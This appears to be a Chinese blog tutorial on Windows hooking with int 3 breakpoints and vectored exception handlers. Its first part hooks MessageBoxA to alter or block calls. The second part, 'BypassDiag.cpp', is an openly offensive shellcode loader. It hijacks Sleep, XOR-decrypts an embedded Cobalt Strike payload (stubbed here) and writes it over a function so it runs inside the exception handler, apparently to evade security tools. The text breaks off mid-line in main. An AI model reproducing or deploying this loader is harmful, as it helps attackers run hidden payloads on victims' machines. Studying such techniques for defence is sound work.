+<h1 id="通过TrampoLine函数进行的Hook"><a href="#通过TrampoLine函数进行的Hook" class="headerlink" title="通过TrampoLine函数进行的Hook"></a>通过TrampoLine函数进行的Hook</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">PVOID g_AddrofMessageBoxA; <span class="comment">//MessageBoxA函数的地址</span></span><br><span class="line">BYTE AddrMessageBoxA_Old; <span class="comment">//保存之前的值</span></span><br><span class="line">ULONG g_jmpBackAddr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_declspec(naked) <span class="function"><span class="type">int</span> WINAPI <span class="title">OriginalMessageBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//写入的int 3指令破坏了原来的指令，因此在这里执行原函数的指令</span></span><br><span class="line">		mov edi, edi</span><br><span class="line">		jmp g_jmpBackAddr  <span class="comment">//跳回原函数被Hook指令之后的位置，绕过自己安装的Hook</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Hook--int 3</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookMessageBoxA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PBYTE AddrMessageBoxA = (PBYTE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	g_AddrofMessageBoxA = AddrMessageBoxA;</span><br><span class="line">	<span class="comment">//保存之前的值</span></span><br><span class="line">	AddrMessageBoxA_Old = (BYTE)*AddrMessageBoxA;</span><br><span class="line">	g_jmpBackAddr = (ULONG)g_AddrofMessageBoxA + <span class="number">2</span>; <span class="comment">//之前指令2个字节</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//向原函数添加跳转到DetourFun的jmp</span></span><br><span class="line">	BYTE newEntry[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	newEntry[<span class="number">0</span>] = <span class="number">0xcc</span>; <span class="comment">//int 3 的机器码 ，此处MessageBox第一行指令占2个字节最后加个nop</span></span><br><span class="line">	<span class="comment">//修改MessageBoxA函数开头，写入我们的 int 3</span></span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">VirtualQuery</span>(AddrMessageBoxA, &amp;mbi, <span class="built_in">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line">	<span class="built_in">VirtualProtect</span>(mbi.BaseAddress, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="built_in">memcpy</span>(AddrMessageBoxA, newEntry, <span class="number">1</span>);   <span class="comment">//写入int 3指令的机器码</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(mbi.BaseAddress, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	VirtualProtect((void*)AddrMessageBoxA, MAX_PATH,dwOldProtect,&amp;dwOldProtect);</span></span><br><span class="line"><span class="comment">	*(BYTE*)(AddrMessageBoxA)=0xcc;</span></span><br><span class="line"><span class="comment">	VirtualProtect((void*)AddrMessageBoxA, MAX_PATH,dwOldProtect,&amp;dwOldProtect);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//要实现的这个VectoredHandler函数，在捕获异常后，会通过异常代码和发生异常的地址来</span></span><br><span class="line"><span class="comment">//判断这里是不是预先埋伏的断点</span></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">VectoredHandlerNew</span><span class="params">(<span class="keyword">struct</span> _EXCEPTION_POINTERS *ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> szNewMsg[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	LONG lResult = EXCEPTION_CONTINUE_SEARCH;  <span class="comment">//在不处理该异常时默认的返回值 继续执行</span></span><br><span class="line">	PEXCEPTION_RECORD pPexceptionRecord = ExceptionInfo-&gt;ExceptionRecord;</span><br><span class="line">	PCONTEXT pContextRecord = ExceptionInfo-&gt;ContextRecord;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	ULONG_PTR* uESP = <span class="number">0</span>;</span><br><span class="line">	PVOID g_Trampoline;  </span><br><span class="line">	DWORD EFlags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	g_Trampoline = pPexceptionRecord-&gt;ExceptionAddress;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;进入VectoredHandlerNew函数\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Exception Address = %p\n&quot;</span>, pPexceptionRecord-&gt;ExceptionAddress);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断异常的类型和异常发生时的Eip</span></span><br><span class="line">	<span class="keyword">if</span> (pPexceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT &amp;&amp; pPexceptionRecord-&gt;ExceptionAddress == g_AddrofMessageBoxA)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;int 3 BreakPoint Hited.\n&quot;</span>);     <span class="comment">//中断命中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//在x64下函数调用的前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中。</span></span><br><span class="line">		<span class="comment">//在x64中，前4个参数依次RCX、RDX、R8、R9 ,按照参数表声明的顺序，从左向右，前4个参数依次放入RCX,RDX,R8,R9中。</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;lpText = 0x%p   %s\n&quot;</span>, pContextRecord-&gt;Rdx, (<span class="type">char</span>*) pContextRecord-&gt;Rdx);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//Rip x64体系</span></span><br><span class="line">		pContextRecord-&gt;Rdx = (ULONG_PTR)szNewMsg;</span><br><span class="line">		pContextRecord-&gt;Rip = (ULONG_PTR)g_Trampoline; <span class="comment">//跳转到Trampoline继续执行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="comment">//86体系,会将函数参数放入栈中</span></span><br><span class="line">		<span class="comment">//修改参数</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ESP = 0x%p\n&quot;</span>, pContextRecord-&gt;Esp);</span><br><span class="line">		uESP = (ULONG_PTR*) pContextRecord-&gt;Esp;</span><br><span class="line">		<span class="built_in">lstrcpyA</span>(szNewMsg, (LPSTR)uESP[<span class="number">2</span>]); <span class="comment">//移动2个字节是函数第二个参数</span></span><br><span class="line">		<span class="built_in">lstrcatA</span>(szNewMsg, <span class="string">&quot;\n\n    Hacked by VectoredHandler.&quot;</span>);</span><br><span class="line">		uESP[<span class="number">2</span>] = (ULONG_PTR)szNewMsg;</span><br><span class="line">		pContextRecord-&gt;Eip = (ULONG_PTR)OriginalMessageBox;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		lResult = EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	 &#125;</span><br><span class="line">	<span class="keyword">return</span> lResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Hook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">0</span>, VectoredHandlerNew);</span><br><span class="line">	<span class="built_in">HookMessageBoxA</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;zhongchang&quot;</span>, <span class="string">&quot;Test&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">InstallHook</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;zhongchang&quot;</span>, <span class="string">&quot;Test&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;zhongchang22222&quot;</span>, <span class="string">&quot;Test&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="拦截调用（调用不下发，直接返回调用者）"><a href="#拦截调用（调用不下发，直接返回调用者）" class="headerlink" title="拦截调用（调用不下发，直接返回调用者）"></a>拦截调用（调用不下发，直接返回调用者）</h1><p>设置Eip为返回地址。</p>
+<blockquote>
+<p>注意：此时栈中还有这次调用压入的参数和返回地址，因此必须把栈还原到调用前的状态，也就是真正的MessageBoxA函数完成后的清栈和返回两个动作。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uESP = (ULONG*) pContextRecord-&gt;Esp;</span><br><span class="line">PContextRecord-&gt;Eip = uESP[<span class="number">0</span>];  <span class="comment">//此时栈顶为返回地址，将其设置为新的Eip</span></span><br><span class="line">pContexeRecord-&gt;Esp += (<span class="number">4</span> + <span class="number">1</span>)*<span class="built_in">sizeof</span>(ULONG_PTR);<span class="comment">//清理压入栈的4个参数和1个返回地址</span></span><br><span class="line">lResult = EXCEPTION_CONTINUE_EXECUTION; <span class="comment">//返回值一定是“继续执行”</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：尽管该方法在x64下也可以正常工作，但因为在x64下的调用约定不同，所以参数不在栈里（取参数和恢复栈时都要注意这一点）。</p>
+</blockquote>
+<h1 id="Hook-Sleep-运行-CS中的shellcode"><a href="#Hook-Sleep-运行-CS中的shellcode" class="headerlink" title="Hook Sleep 运行 CS中的shellcode"></a>Hook Sleep 运行 CS中的shellcode</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// BypassDiag.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Sleep函数地址</span></span><br><span class="line">DWORD64 lpSleepAdr = (DWORD64)&amp;Sleep - <span class="number">1</span>;<span class="comment">// 函数地址 减去1 就是覆盖EB</span></span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line">BYTE Int3[] = &#123; <span class="number">0xcc</span>,<span class="number">0xcc</span>,<span class="number">0xcc</span>,<span class="number">0xcc</span> &#125;;</span><br><span class="line">BYTE Old_Code[<span class="number">4</span>] = &#123; <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DIYFUNC</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">Buf16ToMem16</span><span class="params">(std::string sBuf, _Outptr_ DWORD &amp;BufSize)</span></span>;</span><br><span class="line"><span class="function">std::string <span class="title">hexdump</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> length)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">TOOL_Buffer_to_File</span><span class="params">(<span class="type">char</span>* Buffer, DWORD dwSize, WCHAR *FilePath)</span></span>;</span><br><span class="line"><span class="comment">//加密后的shellcode</span></span><br><span class="line"><span class="type">char</span> X64ShellCode[] = &#123;</span><br><span class="line">	<span class="number">0xED</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xE4</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD DecodeKey[<span class="number">4</span>][<span class="number">4</span>] = &#123; <span class="number">0x0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoadShell</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">LoadShell</span>();</span><br><span class="line">	~<span class="built_in">LoadShell</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span>* <span class="title">Buf16ToMem16</span><span class="params">(std::string sBuf, _Outptr_ DWORD &amp;BufSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span>   __stdcall   <span class="title">callback</span><span class="params">(_EXCEPTION_POINTERS*   excp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//备份当前寄存器</span></span><br><span class="line">	CONTEXT _TmpContext&#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;_TmpContext, excp-&gt;ContextRecord,<span class="built_in">sizeof</span>(CONTEXT));</span><br><span class="line"></span><br><span class="line">	PVOID g_Trampoline;</span><br><span class="line">	g_Trampoline = excp-&gt;ExceptionRecord-&gt;ExceptionAddress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DWORD64 _Rip = (DWORD64)excp-&gt;ContextRecord-&gt;Rip;</span></span><br><span class="line">	<span class="comment">//char ss[0x100]&#123; 0 &#125;;</span></span><br><span class="line">	<span class="comment">//sprintf_s(ss,0x100,&quot;Rip = %x---Chage = %x&quot;, _Rip, lpSleepAdr);</span></span><br><span class="line">	<span class="comment">//MessageBoxA(NULL, ss, ss, NULL);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//解密</span></span><br><span class="line"></span><br><span class="line">	DWORD h1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(X64ShellCode); ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		h1 = i % <span class="number">3</span>;</span><br><span class="line">		X64ShellCode[i] = X64ShellCode[i] ^ DecodeKey[h1][<span class="number">0</span>];</span><br><span class="line">		X64ShellCode[i + <span class="number">1</span>] = X64ShellCode[i + <span class="number">1</span>] ^ DecodeKey[h1][<span class="number">1</span>];</span><br><span class="line">		X64ShellCode[i + <span class="number">2</span>] = X64ShellCode[i + <span class="number">2</span>] ^ DecodeKey[h1][<span class="number">2</span>];</span><br><span class="line">		i += <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Sleep 修改回去</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)lpSleepAdr, <span class="number">0x4</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);</span><br><span class="line">	<span class="comment">//设置属性</span></span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="type">void</span>*)lpSleepAdr, Old_Code, <span class="built_in">sizeof</span>(Old_Code));</span><br><span class="line">	<span class="comment">//恢复属性</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)lpSleepAdr, <span class="number">0x4</span>, OldProtect, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	DWORD oodd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">////修改函数内容  如果函数被优化这一段将会出错 并引发异常导致一直在异常中</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)&amp;DIYFUNC, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oodd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;DIYFUNC, X64ShellCode, <span class="built_in">sizeof</span>(X64ShellCode));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)&amp;DIYFUNC, <span class="number">0x1000</span>, oodd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//void* Memory = VirtualAlloc(NULL, sizeof(X64ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">//for (int i = 0; i &lt; sizeof(X64ShellCode); ++i)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	((char*)Memory)[i] = X64ShellCode[i];</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	<span class="comment">//((void(*)())Memory)();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//--------------------------------------------------------------- 重新设置RIP</span></span><br><span class="line">	excp-&gt;ContextRecord-&gt;Rcx = _TmpContext.Rcx;</span><br><span class="line">	excp-&gt;ContextRecord-&gt;Rdx = _TmpContext.Rdx;</span><br><span class="line">	<span class="comment">//excp-&gt;ContextRecord-&gt;Rip--;</span></span><br><span class="line"></span><br><span class="line">	excp-&gt;ContextRecord-&gt;Rip = (ULONG_PTR)g_Trampoline;</span><br><span class="line">	<span class="comment">//SetThreadContext(GetCurrentThread(), excp-&gt;ContextRecord);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//继续运行</span></span><br><span class="line">	<span class="keyword">return</span>   EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> arg, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> Key1[<span class="number">4</span>] = &#123; <span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span> &#125;;</span><br><span class="line">	<span class="type">char</span> Key2[<span class="number">4</span>] = &#123; <span class="number">0x1</span>,<span 